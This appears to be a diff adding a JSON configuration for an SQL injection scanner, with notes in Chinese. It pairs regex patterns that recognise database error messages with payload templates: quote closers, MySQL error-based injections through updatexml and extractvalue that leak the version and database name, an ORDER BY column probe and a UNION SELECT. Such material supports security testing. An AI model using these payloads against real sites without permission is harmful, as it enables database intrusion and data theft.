@@ -1,0 +1,21 @@
+{
+  "error_patterns": [
+    {"regex": "You have an error in your SQL syntax", "db": "MySQL", "note": "MySQL 语法错误回显"},
+    {"regex": "unclosed quotation mark|syntax error|SQLSTATE", "db": "通用 / SQL Server", "note": "SQL 语法错误"},
+    {"regex": "mysql_fetch|mysql_query|mysqli_|Warning: mysql", "db": "MySQL", "note": "MySQL 函数错误回显"},
+    {"regex": "PostgreSQL|pg_query|psql", "db": "PostgreSQL", "note": "PostgreSQL 错误"},
+    {"regex": "ORA-\\d{4,5}|Oracle|PL/SQL", "db": "Oracle", "note": "Oracle 错误"},
+    {"regex": "SQLite|sqlite3", "db": "SQLite", "note": "SQLite 错误"},
+    {"regex": "Microsoft SQL Server|ODBC|OLE DB", "db": "SQL Server", "note": "SQL Server 错误"},
+    {"regex": "updatexml|extractvalue|XPATH syntax error", "db": "MySQL", "note": "报错注入函数回显"},
+    {"regex": "information_schema", "db": "MySQL", "note": "数据库系统表泄露"}
+  ],
+  "payloads": [
+    {"id": "single-quote", "name": "单引号闭合", "template": "{value}'", "note": "触发未闭合引号语法错误"},
+    {"id": "double-quote", "name": "双引号闭合", "template": "{value}\"", "note": "触发语法错误"},
+    {"id": "error-updatexml", "name": "updatexml 报错注入", "template": "{value}' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -", "note": "MySQL 报错注入"},
+    {"id": "error-extractvalue", "name": "extractvalue 报错注入", "template": "{value}' AND extractvalue(1,concat(0x7e,database(),0x7e))-- -", "note": "MySQL 报错注入"},
+    {"id": "union-orderby", "name": "联合查询列数探测", "template": "{value}' ORDER BY 10-- -", "note": "联合查询前置探测"},
+    {"id": "union-select", "name": "联合查询数据提取", "template": "{value}' UNION SELECT 1,2,3-- -", "note": "联合查询"}
+  ]
+}
